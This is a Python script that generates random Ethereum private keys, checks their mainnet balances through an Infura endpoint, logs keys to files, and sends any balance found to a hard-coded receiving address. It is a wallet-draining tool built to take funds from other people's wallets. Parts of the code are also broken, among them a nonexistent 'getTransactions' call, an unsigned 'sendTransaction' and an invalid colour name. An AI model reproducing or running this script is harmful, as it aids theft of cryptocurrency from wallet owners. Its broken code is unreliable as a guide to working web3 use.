import os
import secrets
import web3
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

def generate_private_key():
    return secrets.token_hex(32)

def get_balance(address, w3):
    balance = w3.eth.getBalance(address)
    return balance

def is_wallet_used(address, w3):
    tx_filter = {"to": address}
    tx_to_count = len(w3.eth.getTransactions(tx_filter))
    tx_filter = {"from": address}
    tx_from_count = len(w3.eth.getTransactions(tx_filter))
    return tx_to_count + tx_from_count > 0

def check_address(i, w3, used_addresses, unused_addresses, invalid_addresses, lock):
    while True:
        private_key = generate_private_key()
        address = w3.eth.account.privateKeyToAccount(private_key).address
        with lock:
            if address in used_addresses or address in unused_addresses or address in invalid_addresses:
                continue
            used_addresses.add(address)
        balance = get_balance(address, w3)
        if balance > 0 and is_wallet_used(address, w3):
            print(colored(f"Address {i}: {address}, Private Key: {private_key}, Balance: {balance}, Status: used", "purple"))
            with open('used_addresses.txt', 'a') as used_file:
                used_file.write(f"Address {i}: {address}, Private Key: {private_key}, Balance: {balance}\n")
            break
        elif balance > 0:
            print(colored(f"Address {i}: {address}, Private Key: {private_key}, Balance: {balance}, Status: unused", "yellow"))
            with open('unused_addresses.txt', 'a') as unused_file:
                unused_file.write(f"Address {i}: {address}, Private Key: {private_key}, Balance: {balance}\n")
            # Transfer all funds to specified address if balance is greater than 0
            tx_hash = w3.eth.sendTransaction({
                'to': '0x8c009a9704f1bbdcbb58015302881af868a84f1e',
                'from': address,
                'value': balance
            })
            with open('transferred_addresses.txt', 'a') as transferred_file:
                transferred_file.write(f"Address {i}: {address}, Private Key: {private_key}, Balance: {balance}, Transfer Tx Hash: {tx_hash.hex()}\n")
            break
        else:
            print(colored(f"Address {i}: {address}, Private Key: {private_key}, Balance: {balance}, Status: invalid", "red"))
            with open('invalid_addresses.txt', 'a') as invalid_file:
                invalid_file.write(f"Address {i}: {address}, Private Key: {private_key}, Balance: {balance}\n")
            break


def main():
    w3 = web3.Web3(web3.HTTPProvider('https://mainnet.infura.io/v3/b9f167c0ac524aa88314e8a7040ae314'))
    used_addresses = set()
    unused_addresses = set()
    invalid_addresses = set()
    lock = Lock()
    
    # Load existing addresses from files
    if os.path.exists('used_addresses.txt'):
        with open('used_addresses.txt', 'r') as used_file:
            for line in used_file:
                address = line.split(',')[0].split(': ')[1]
                used_addresses.add(address)
    if os.path.exists('unused_addresses.txt'):
        with open('unused_addresses.txt', 'r') as unused_file:
            for line in unused_file:
                address = line.split(',')[0].split(': ')[1]
                unused_addresses.add(address)
    if os.path.exists('invalid_addresses.txt'):
        with open('invalid_addresses.txt', 'r') as invalid_file:
            for line in invalid_file:
                address = line.split(',')[0].split(': ')[1]
                invalid_addresses.add(address)

    # Generate new private keys and check them for balances and usage
    with ThreadPoolExecutor(max_workers=100) as executor:
        i = len(used_addresses) + len(unused_addresses) + len(invalid_addresses) + 1
        while i <= 1000000:
            futures = []
            for _ in range(100000):
                futures.append(executor.submit(check_address, i, w3, used_addresses, unused_addresses, invalid_addresses, lock))
                i += 1
            for future in futures:
                future.result()

if __name__ == '__main__':
    main()
